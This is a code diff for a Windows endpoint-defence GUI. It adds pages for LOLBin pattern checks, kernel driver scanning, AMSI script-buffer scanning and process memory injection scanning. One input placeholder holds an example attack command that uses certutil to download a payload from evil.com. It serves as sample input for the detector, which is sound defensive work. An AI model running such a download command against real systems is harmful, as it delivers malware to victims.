@@ -616,15 +616,31 @@ class CyberSentinelGUI(QMainWindow):
             from modules.chain_correlator import ChainCorrelator
             from modules.baseline_engine  import BaselineEngine
             from modules.amsi_monitor     import AmsiMonitor
+            from modules.amsi_hook        import AmsiScanner, FilelessMonitor
+            from modules.lolbin_detector  import LolbinDetector
+            from modules.driver_guard     import DriverGuard
+            from modules.c2_fingerprint   import Ja3Monitor, FeodoMonitor, DgaMonitor
             from modules.intel_updater    import update_all, feed_status
             from modules.network_isolation import isolate_network, restore_network
 
-            self.logic    = ScannerLogic()
-            self.lolbas   = LolbasDetector()
-            self.byovd    = ByovdDetector()
-            self.correlator = ChainCorrelator()
-            self.baseline = BaselineEngine()
-            self.amsi     = AmsiMonitor()
+            self.logic        = ScannerLogic()
+            self.lolbas       = LolbasDetector()
+            self.byovd        = ByovdDetector()
+            self.correlator   = ChainCorrelator()
+            self.baseline     = BaselineEngine()
+            self.amsi         = AmsiMonitor()
+            # ── Newly wired modules ────────────────────────────────────
+            self.lolbin       = LolbinDetector()
+            self.driver_guard = DriverGuard()
+            self.fileless     = FilelessMonitor(correlator=self.correlator)
+            self.amsi_scanner = AmsiScanner()
+            self.feodo        = FeodoMonitor()
+            self.dga          = DgaMonitor()
+            self.ja3          = Ja3Monitor()
+            # Start C2 background monitors
+            self.feodo.start()
+            self.ja3.start()
+            # ──────────────────────────────────────────────────────────
             self.update_all   = update_all
             self.feed_status  = feed_status
             self.isolate_net  = isolate_network
@@ -669,10 +685,13 @@ class CyberSentinelGUI(QMainWindow):
             ("scan_hash",  self._build_scan_hash_page),
             ("live_edr",   self._build_live_edr_page),
             ("lolbas",     self._build_lolbas_page),
+            ("lolbin",     self._build_lolbin_page),
             ("byovd",      self._build_byovd_page),
+            ("driver_guard", self._build_driver_guard_page),
             ("chains",     self._build_chains_page),
             ("baseline",   self._build_baseline_page),
             ("fileless",   self._build_fileless_page),
+            ("amsi_hook",  self._build_amsi_hook_page),
             ("network",    self._build_network_page),
             ("intel",      self._build_intel_page),
             ("settings",   self._build_settings_page),
@@ -757,10 +776,13 @@ class CyberSentinelGUI(QMainWindow):
             ]),
             ("DETECTORS", [
                 ("🪝  LoLBin Abuse",    "lolbas"),
+                ("🔍  LolbinDetector",  "lolbin"),
                 ("💀  BYOVD Drivers",   "byovd"),
+                ("🛡️  DriverGuard",     "driver_guard"),
                 ("🔗  Attack Chains",   "chains"),
                 ("📐  Baseline",        "baseline"),
                 ("👻  Fileless / AMSI", "fileless"),
+                ("🪤  AMSI Hook",       "amsi_hook"),
             ]),
             ("MANAGEMENT", [
                 ("🌐  Network",         "network"),
@@ -2034,6 +2056,67 @@ class CyberSentinelGUI(QMainWindow):
                     f"normalized command was also checked.", THEME["muted"]
                 )
 
+    # ── PAGE: LOLBIN DETECTOR ─────────────────────────────────────────────────
+
+    def _build_lolbin_page(self):
+        page = QWidget()
+        layout = QVBoxLayout(page)
+        layout.setContentsMargins(0, 0, 0, 0)
+        layout.setSpacing(0)
+        layout.addWidget(self._page_header(
+            "🔍", "LolbinDetector",
+            "Process-level LOLBAS pattern matching — check any running process name and command line"
+        ))
+
+        inner = QWidget()
+        inner_layout = QVBoxLayout(inner)
+        inner_layout.setContentsMargins(24, 20, 24, 20)
+        inner_layout.setSpacing(12)
+
+        form = QGroupBox("Process Check")
+        form_layout = QVBoxLayout(form)
+        row1 = QHBoxLayout()
+        row1.addWidget(QLabel("Process Name:"))
+        self._lolbin_name = QLineEdit()
+        self._lolbin_name.setPlaceholderText("e.g. certutil.exe")
+        row1.addWidget(self._lolbin_name, 1)
+        form_layout.addLayout(row1)
+        row2 = QHBoxLayout()
+        row2.addWidget(QLabel("Command Line: "))
+        self._lolbin_cmd = QLineEdit()
+        self._lolbin_cmd.setPlaceholderText("e.g. certutil -urlcache -split -f http://evil.com/payload.exe")
+        row2.addWidget(self._lolbin_cmd, 1)
+        form_layout.addLayout(row2)
+        check_btn = QPushButton("🔍  Check Process")
+        check_btn.setObjectName("primary")
+        check_btn.clicked.connect(self._run_lolbin_check)
+        form_layout.addWidget(check_btn)
+        inner_layout.addWidget(form)
+
+        grp = QGroupBox("Detection Result")
+        grp_layout = QVBoxLayout(grp)
+        self._lolbin_result = QTextEdit()
+        self._lolbin_result.setReadOnly(True)
+        self._lolbin_result.setMinimumHeight(200)
+        self._lolbin_result.setStyleSheet(f"background:{THEME['bg']}; color:{THEME['text']}; font-family: Consolas;")
+        grp_layout.addWidget(self._lolbin_result)
+        inner_layout.addWidget(grp, 1)
+
+        layout.addWidget(inner, 1)
+        return page
+
+    def _run_lolbin_check(self):
+        name = self._lolbin_name.text().strip()
+        cmd  = self._lolbin_cmd.text().strip()
+        if not name:
+            self._lolbin_result.setPlainText("⚠  Enter a process name.")
+            return
+        hit = self.lolbin.check_process(name, cmd)
+        if hit:
+            self._lolbin_result.setPlainText(self.lolbin.format_alert(hit))
+        else:
+            self._lolbin_result.setPlainText(f"✅  No LOLBAS pattern matched for '{name}'.")
+
     # ── PAGE: BYOVD ───────────────────────────────────────────────────────────
 
     def _build_byovd_page(self):
@@ -2109,6 +2192,93 @@ class CyberSentinelGUI(QMainWindow):
                 t.setItem(row, 2, table_item(f.get("sha256") or "", THEME["muted"]))
                 t.setItem(row, 3, table_item(f.get("risk_level", "HIGH"), THEME["red"]))
                 t.setItem(row, 4, table_item((f.get("description") or "")[:60], THEME["muted"]))
+
+    # ── PAGE: DRIVER GUARD ────────────────────────────────────────────────────
+
+    def _build_driver_guard_page(self):
+        page = QWidget()
+        layout = QVBoxLayout(page)
+        layout.setContentsMargins(0, 0, 0, 0)
+        layout.setSpacing(0)
+        layout.addWidget(self._page_header(
+            "🛡️", "DriverGuard",
+            "Kernel driver integrity monitor — checks loaded .sys files against threat signatures"
+        ))
+
+        inner = QWidget()
+        inner_layout = QVBoxLayout(inner)
+        inner_layout.setContentsMargins(24, 20, 24, 20)
+        inner_layout.setSpacing(12)
+
+        btn_row = QHBoxLayout()
+        scan_btn = QPushButton("🛡️  Scan Drivers Now")
+        scan_btn.setObjectName("primary")
+        scan_btn.setMinimumWidth(180)
+        scan_btn.clicked.connect(self._run_driver_guard_scan)
+        btn_row.addWidget(scan_btn)
+        rt_btn = QPushButton("⏱  Start Real-Time Monitor")
+        rt_btn.clicked.connect(self._start_driver_guard_realtime)
+        btn_row.addWidget(rt_btn)
+        btn_row.addStretch()
+        inner_layout.addLayout(btn_row)
+
+        self._dg_progress = QProgressBar()
+        self._dg_progress.setRange(0, 0)
+        self._dg_progress.setVisible(False)
+        self._dg_progress.setFixedHeight(4)
+        inner_layout.addWidget(self._dg_progress)
+
+        grp = QGroupBox("Driver Guard Results")
+        grp_layout = QVBoxLayout(grp)
+        self._dg_table = make_table(["Driver", "SHA-256", "CVE / Threat", "Details"])
+        grp_layout.addWidget(self._dg_table)
+        inner_layout.addWidget(grp, 1)
+
+        layout.addWidget(inner, 1)
+        return page
+
+    def _run_driver_guard_scan(self):
+        self._dg_table.setRowCount(0)
+        self._dg_progress.setVisible(True)
+
+        def _do():
+            import os
+            findings = []
+            drv_dir = r"C:\Windows\System32\drivers"
+            if os.path.isdir(drv_dir):
+                for fname in os.listdir(drv_dir):
+                    if fname.lower().endswith(".sys"):
+                        hit = self.driver_guard.check_driver(os.path.join(drv_dir, fname))
+                        if hit:
+                            findings.append(hit)
+            return findings
+
+        worker = GenericWorker(_do)
+        worker.finished.connect(self._dg_scan_done)
+        self._workers.append(worker)
+        worker.start()
+
+    def _dg_scan_done(self, findings):
+        self._dg_progress.setVisible(False)
+        t = self._dg_table
+        t.setRowCount(0)
+        if not findings:
+            row = t.rowCount(); t.insertRow(row)
+            t.setItem(row, 0, table_item("✅  No suspicious kernel drivers detected", THEME["green"]))
+            for i in range(1, 4):
+                t.setItem(row, i, table_item(""))
+        else:
+            for f in findings:
+                row = t.rowCount(); t.insertRow(row)
+                t.setItem(row, 0, table_item(f.get("driver_name", "—")))
+                t.setItem(row, 1, table_item((f.get("sha256") or "")[:20] + "…", THEME["muted"]))
+                t.setItem(row, 2, table_item(f.get("cve", "N/A"), THEME["red"]))
+                t.setItem(row, 3, table_item((f.get("description") or "")[:80], THEME["muted"]))
+
+    def _start_driver_guard_realtime(self):
+        self.driver_guard.start_realtime_monitor()
+        from PyQt6.QtWidgets import QMessageBox
+        QMessageBox.information(self, "DriverGuard", "Real-time kernel driver monitor started.")
 
     # ── PAGE: ATTACK CHAINS ───────────────────────────────────────────────────
 
@@ -2330,6 +2500,214 @@ class CyberSentinelGUI(QMainWindow):
                 t.setItem(row, 2, table_item(r.get("pid", "—")))
                 t.setItem(row, 3, table_item(r.get("findings") or "—", THEME["yellow"]))
             t.resizeRowsToContents()
+
+    # ── PAGE: AMSI HOOK ───────────────────────────────────────────────────────
+
+    def _build_amsi_hook_page(self):
+        page = QWidget()
+        layout = QVBoxLayout(page)
+        layout.setContentsMargins(0, 0, 0, 0)
+        layout.setSpacing(0)
+        layout.addWidget(self._page_header(
+            "🪤", "AMSI Hook / AmsiScanner",
+            "Scan script buffers through AMSI + heuristics, or probe process memory for injection"
+        ))
+
+        inner = QWidget()
+        inner_layout = QVBoxLayout(inner)
+        inner_layout.setContentsMargins(24, 20, 24, 20)
+        inner_layout.setSpacing(12)
+
+        # ── Script Buffer Scan ────────────────────────────────────────────────
+        script_grp = QGroupBox("Script Buffer Scan (AmsiScanner)")
+        script_layout = QVBoxLayout(script_grp)
+        note = QLabel("Paste a PowerShell / VBScript / batch payload below and click Scan.")
+        note.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
+        script_layout.addWidget(note)
+        self._amsi_script_input = QTextEdit()
+        self._amsi_script_input.setPlaceholderText("Paste script content here…")
+        self._amsi_script_input.setFixedHeight(110)
+        script_layout.addWidget(self._amsi_script_input)
+        scan_script_btn = QPushButton("🪤  Scan Script Buffer")
+        scan_script_btn.setObjectName("primary")
+        scan_script_btn.clicked.connect(self._amsi_scan_script)
+        script_layout.addWidget(scan_script_btn)
+        inner_layout.addWidget(script_grp)
+
+        # ── Process Memory Scan — splitter: table left, controls right ────────
+        mem_grp = QGroupBox("Process Memory Scan (FilelessMonitor)")
+        mem_outer = QVBoxLayout(mem_grp)
+
+        hint = QLabel("💡  Click any row to select a process — PID fills automatically. "
+                      "Double-click to scan it instantly.")
+        hint.setStyleSheet(f"color: {THEME['muted']}; font-size: 10px;")
+        mem_outer.addWidget(hint)
+
+        splitter = QSplitter(Qt.Orientation.Horizontal)
+
+        # Left: live process table
+        proc_panel = QWidget()
+        proc_layout = QVBoxLayout(proc_panel)
+        proc_layout.setContentsMargins(0, 0, 0, 0)
+        proc_layout.setSpacing(4)
+
+        # Filter bar
+        filter_row = QHBoxLayout()
+        self._amsi_proc_filter = QLineEdit()
+        self._amsi_proc_filter.setPlaceholderText("Filter by name…")
+        self._amsi_proc_filter.textChanged.connect(self._amsi_filter_processes)
+        filter_row.addWidget(self._amsi_proc_filter)
+        refresh_btn = QPushButton("↻  Refresh")
+        refresh_btn.setMaximumWidth(90)
+        refresh_btn.clicked.connect(self._amsi_refresh_processes)
+        filter_row.addWidget(refresh_btn)
+        proc_layout.addLayout(filter_row)
+
+        # Process table — PID | Name | Path
+        self._amsi_proc_table = make_table(["PID", "Process Name", "Executable Path"], stretch_col=2)
+        self._amsi_proc_table.setFixedHeight(180)
+        self._amsi_proc_table.itemSelectionChanged.connect(self._amsi_proc_selected)
+        self._amsi_proc_table.cellDoubleClicked.connect(self._amsi_proc_double_clicked)
+        proc_layout.addWidget(self._amsi_proc_table)
+        splitter.addWidget(proc_panel)
+
+        # Right: PID field + action buttons
+        ctrl_panel = QWidget()
+        ctrl_layout = QVBoxLayout(ctrl_panel)
+        ctrl_layout.setContentsMargins(8, 0, 0, 0)
+        ctrl_layout.setSpacing(8)
+
+        pid_row = QHBoxLayout()
+        pid_row.addWidget(QLabel("PID:"))
+        self._amsi_pid = QLineEdit()
+        self._amsi_pid.setPlaceholderText("Select row or type")
+        self._amsi_pid.setMaximumWidth(90)
+        pid_row.addWidget(self._amsi_pid)
+        pid_row.addStretch()
+        ctrl_layout.addLayout(pid_row)
+
+        scan_mem_btn = QPushButton("🔬  Scan Selected Process")
+        scan_mem_btn.setObjectName("primary")
+        scan_mem_btn.clicked.connect(self._amsi_scan_memory)
+        ctrl_layout.addWidget(scan_mem_btn)
+
+        bg_mon_btn = QPushButton("⏱  Start Background Monitor\n(all processes, 60 s interval)")
+        bg_mon_btn.clicked.connect(self._amsi_start_memory_monitor)
+        ctrl_layout.addWidget(bg_mon_btn)
+
+        ctrl_layout.addStretch()
+        splitter.addWidget(ctrl_panel)
+        splitter.setSizes([680, 220])
+        mem_outer.addWidget(splitter)
+        inner_layout.addWidget(mem_grp)
+
+        # ── Output console ────────────────────────────────────────────────────
+        result_grp = QGroupBox("AMSI Hook Output")
+        result_layout = QVBoxLayout(result_grp)
+        self._amsi_hook_output = QTextEdit()
+        self._amsi_hook_output.setReadOnly(True)
+        self._amsi_hook_output.setStyleSheet(
+            f"background:{THEME['bg']}; color:{THEME['text']}; font-family: Consolas; font-size: 11px;"
+        )
+        result_layout.addWidget(self._amsi_hook_output)
+        inner_layout.addWidget(result_grp, 1)
+
+        layout.addWidget(inner, 1)
+
+        # Populate process table on first open
+        self._amsi_refresh_processes()
+        return page
+
+    # ── AMSI Hook handlers ────────────────────────────────────────────────────
+
+    def _amsi_refresh_processes(self):
+        """Populate the process table with all currently running processes."""
+        import psutil
+        self._amsi_proc_table.setRowCount(0)
+        self._amsi_all_procs = []   # cache for filtering
+        for proc in psutil.process_iter(["pid", "name", "exe"]):
+            try:
+                pid  = proc.info["pid"]
+                name = proc.info["name"] or ""
+                exe  = proc.info["exe"] or ""
+                self._amsi_all_procs.append((str(pid), name, exe))
+            except (psutil.AccessDenied, psutil.NoSuchProcess):
+                continue
+        self._amsi_all_procs.sort(key=lambda r: r[1].lower())
+        self._amsi_populate_proc_table(self._amsi_all_procs)
+
+    def _amsi_populate_proc_table(self, rows):
+        t = self._amsi_proc_table
+        t.setRowCount(0)
+        # Highlight script-capable processes in yellow for quick identification
+        SCRIPT_PROCS = {"powershell.exe", "pwsh.exe", "wscript.exe",
+                        "cscript.exe", "cmd.exe", "mshta.exe"}
+        for pid, name, exe in rows:
+            r = t.rowCount()
+            t.insertRow(r)
+            color = THEME["yellow"] if name.lower() in SCRIPT_PROCS else None
+            t.setItem(r, 0, table_item(pid,  THEME["blue"]))
+            t.setItem(r, 1, table_item(name, color))
+            t.setItem(r, 2, table_item(exe))
+
+    def _amsi_filter_processes(self, text):
+        """Filter the process table rows by name as the user types."""
+        if not hasattr(self, "_amsi_all_procs"):
+            return
+        q = text.lower()
+        filtered = [(p, n, e) for p, n, e in self._amsi_all_procs if q in n.lower() or q in p]
+        self._amsi_populate_proc_table(filtered)
+
+    def _amsi_proc_selected(self):
+        """Auto-fill the PID field when a row is clicked."""
+        rows = self._amsi_proc_table.selectedItems()
+        if rows:
+            self._amsi_pid.setText(self._amsi_proc_table.item(
+                self._amsi_proc_table.currentRow(), 0).text())
+
+    def _amsi_proc_double_clicked(self, row, _col):
+        """Double-click a row to scan that process immediately."""
+        pid_item = self._amsi_proc_table.item(row, 0)
+        if pid_item:
+            self._amsi_pid.setText(pid_item.text())
+            self._amsi_scan_memory()
+
+    def _amsi_scan_script(self):
+        content = self._amsi_script_input.toPlainText().strip()
+        if not content:
+            self._amsi_hook_output.setPlainText("⚠  Paste script content first.")
+            return
+        is_mal, findings = self.amsi_scanner.scan_buffer(content, "gui_buffer")
+        if findings:
+            self._amsi_hook_output.setPlainText(
+                "🔴  MALICIOUS INDICATORS DETECTED:\n" + "\n".join(f"  ✗ {f}" for f in findings)
+            )
+        else:
+            self._amsi_hook_output.setPlainText("✅  No malicious indicators found in script buffer.")
+
+    def _amsi_scan_memory(self):
+        pid_s = self._amsi_pid.text().strip()
+        if not pid_s.isdigit():
+            self._amsi_hook_output.setPlainText("⚠  Select a process from the table or enter a valid PID.")
+            return
+        name_item = self._amsi_proc_table.item(self._amsi_proc_table.currentRow(), 1)
+        name = name_item.text() if name_item else pid_s
+        self._amsi_hook_output.setPlainText(f"[*] Scanning PID {pid_s} ({name}) for memory injection…")
+        hit = self.fileless.scan_process_memory(int(pid_s))
+        if not hit:
+            self._amsi_hook_output.setPlainText(
+                f"✅  PID {pid_s} ({name}): no memory injection patterns detected.")
+        else:
+            self._amsi_hook_output.setPlainText(
+                f"🔴  INJECTION PATTERN DETECTED in PID {pid_s} ({name}):\n{hit}")
+
+    def _amsi_start_memory_monitor(self):
+        self.fileless.start_memory_monitor()
+        self._amsi_hook_output.setPlainText(
+            "[+] Background memory injection monitor started.\n"
+            "    Scanning all processes every 60 seconds.\n"
+            "    Alerts will appear in Fileless / AMSI Alerts page."
+        )
 
     # ── PAGE: NETWORK ─────────────────────────────────────────────────────────
 
